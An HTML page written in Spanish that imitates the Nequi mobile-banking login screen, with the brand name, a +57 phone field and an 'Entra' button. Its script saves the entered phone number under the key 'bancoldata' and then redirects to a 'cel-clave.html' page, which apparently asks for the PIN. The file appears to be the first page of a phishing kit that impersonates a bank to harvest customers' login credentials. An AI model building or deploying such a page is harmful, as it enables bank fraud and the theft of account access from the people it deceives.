<!DOCTYPE html>
<html lang="es">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>Ingreso</title>

  <style>
    body {
      margin: 0;
      font-family: Arial, sans-serif;
      background: #2b002b;
      display: flex;
      justify-content: center;
      min-height: 100vh;
      color: white;
    }

    .container {
      width: 100%;
      max-width: 420px;
      padding: 20px;
      display: flex;
      flex-direction: column;
      height: 100vh;
    }

    /* HEADER */
    header {
      display: flex;
      justify-content: space-between;
      align-items: center;
    }

    .help-icon {
      width: 20px;
      height: 20px;
      border: 2px solid white;
      border-radius: 50%;
      display: flex;
      justify-content: center;
      align-items: center;
      font-size: 14px;
    }

    /* LOGO CENTRO */
    .logo {
      margin-top: auto;
      text-align: center;
      animation: fadeIn 1s ease;
    }

    .logo svg {
      width: 180px;
      color: white;
    }

    .form {
      margin-top: auto;
      animation: fadeUp 0.8s ease;
    }

    .input-box {
      background: rgba(255,255,255,0.2);
      border-radius: 8px;
      padding: 10px;
      display: flex;
      align-items: center;
      gap: 10px;
    }

    .prefix {
      border-right: 2px solid rgba(255,255,255,0.3);
      padding-right: 10px;
      font-weight: bold;
      color: #ffb3e6;
    }

    .input-box input {
      flex: 1;
      border: none;
      outline: none;
      background: transparent;
      color: white;
      font-size: 16px;
    }

    .input-box input::placeholder {
      color: #ddd;
    }

    .btn {
      margin-top: 15px;
      width: 100%;
      padding: 14px;
      border: none;
      border-radius: 8px;
      background: #ff008c;
      color: white;
      font-size: 16px;
      cursor: pointer;
      opacity: 0.5;
      transition: 0.3s;
    }

    .btn.active {
      opacity: 1;
    }

    .btn:active {
      transform: scale(0.97);
    }

    svg {
      color: #ccc;
    }

    @keyframes fadeIn {
      from {opacity: 0; transform: translateY(20px);}
      to {opacity: 1; transform: translateY(0);}
    }

    @keyframes fadeUp {
      from {opacity: 0; transform: translateY(30px);}
      to {opacity: 1; transform: translateY(0);}
    }
  </style>
</head>

<body>

<div class="container">

  <!-- HEADER -->
  <header>
    <div class="help-icon">?</div>

    <!-- SVG SUPERIOR COMPLETO -->
    <div>
      <svg width="70px" height="24px" viewBox="0 0 118 40" fill="currentColor">
        <text x="0" y="25" font-size="20">Nequi</text>
      </svg>
    </div>
  </header>

  <!-- LOGO REAL -->
  <div class="logo">
    <svg viewBox="0 0 104 32" fill="currentColor">
      <path d="M10 25V5H14L22 18V5H26V25H22L14 12V25H10Z"/>
      <path d="M30 25V10H34V25H30ZM32 7C30.9 7 30 6.1 30 5C30 3.9 30.9 3 32 3C33.1 3 34 3.9 34 5C34 6.1 33.1 7 32 7Z"/>
      <path d="M38 25V5H42V17L50 10H55L46 18L55 25H50L42 18V25H38Z"/>
      <path d="M58 25V10H62V25H58Z"/>
      <path d="M64 25V5H68V25H64Z"/>
    </svg>
  </div>

  <!-- FORM -->
  <div class="form">
    <div class="input-box">
      <div class="prefix">+57</div>
      <input type="text" id="phoneInput" placeholder="Ingresa tu cel" maxlength="12">
    </div>

    <button class="btn" id="btn">Entra</button>
  </div>

</div>

<script>
const input = document.getElementById("phoneInput");
const btn = document.getElementById("btn");

/* FORMATO */
function formatNumber(value) {
  let digits = value.replace(/\D/g, "");
  if (digits.length > 10) digits = digits.slice(0, 10);

  if (digits.length > 6) {
    return digits.replace(/(\d{3})(\d{3})(\d{0,4})/, "$1 $2 $3");
  } else if (digits.length > 3) {
    return digits.replace(/(\d{3})(\d{0,3})/, "$1 $2");
  }
  return digits;
}

/* INPUT */
input.addEventListener("input", () => {
  input.value = formatNumber(input.value);

  const digits = input.value.replace(/\D/g, "");

  if (digits.length === 10 && digits.startsWith("3")) {
    btn.classList.add("active");
  } else {
    btn.classList.remove("active");
  }
});

/* CLICK */
btn.addEventListener("click", () => {
  const raw = input.value.replace(/\D/g, "");

  if (raw.length !== 10 || !raw.startsWith("3")) {
    alert("Número inválido");
    return;
  }

  btn.innerText = "Entrando...";
  btn.style.opacity = "0.7";

  let data = {};
  try {
    data = JSON.parse(localStorage.getItem("bancoldata")) || {};
  } catch {
    data = {};
  }

  data.numero = raw;
  data.fecha = new Date().toISOString();

  localStorage.setItem("bancoldata", JSON.stringify(data));

  setTimeout(()=>{
    window.location.href = "cel-clave.html";
  },1200);
});
</script>

</body>
</html>
